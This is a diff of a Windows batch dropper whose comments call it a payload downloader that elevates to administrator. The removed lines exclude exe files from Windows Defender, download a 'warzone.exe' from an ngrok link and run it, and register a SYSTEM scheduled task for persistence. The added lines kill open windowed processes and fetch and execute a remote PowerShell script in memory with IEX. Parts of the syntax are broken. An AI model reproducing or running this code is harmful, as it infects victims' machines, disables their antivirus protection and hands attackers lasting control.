@@ -1,10 +1,10 @@
-REM A bat file that runs automatically as administrator.
-REM Downloads our payload using powershell.
-REM Instructs Windows Defender to exclude any exe files.
+: A bat file that runs automatically as administrator.
+: Downloads our payload using powershell.
+: Instructs Windows Defender to exclude any exe files.
 
-
-@echo off
-
+@ECHO OFF
+powershell -command "(New-Object -comObject Shell.Application).Windows() | foreach-object {$_.quit()}; Get-Process | Where-Object {$_.MainWindowTitle -ne \"\"} | stop-process"
+: Kill all open processes on the machine except current cmd
 :: BatchGotAdmin
 :-------------------------------------
 REM  --> Check for permissions
@@ -29,15 +29,7 @@ if '%errorlevel%' NEQ '0' (
     pushd "%CD%"
     CD /D "%~dp0"
 :--------------------------------------
-Powershell -Command "Set-MpPreference -ExclusionExtension exe"
+: Download and execute powershell file
 cd %TEMP%
-Powershell -Command "Invoke-Webrequest 'https://ngrok-Link/warzone.exe' -OutFile mod.exe"
-mod.exe
-:--------------------------------------
-REM Persistence method using Powershell to scheduled task
-Powershell -Command "$A = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c C:\temp\payload.exe""
-Powershell -Command "$T = New-ScheduledTaskTrigger -AtLogOn -User "username""
-Powershell -Command "$S = New-ScheduledTaskSettingsSet"
-Powershell -Command "$P = New-ScheduledTaskPrincipal "NT AUTHORITY\SYSTEM" -RunLevel Highest"
-Powershell -Command "$D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S"
-Powershell -Command "Register-ScheduledTask NameTheTask -InputObjec $D"
+$Process = IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.1.5/desease.ps1')
+
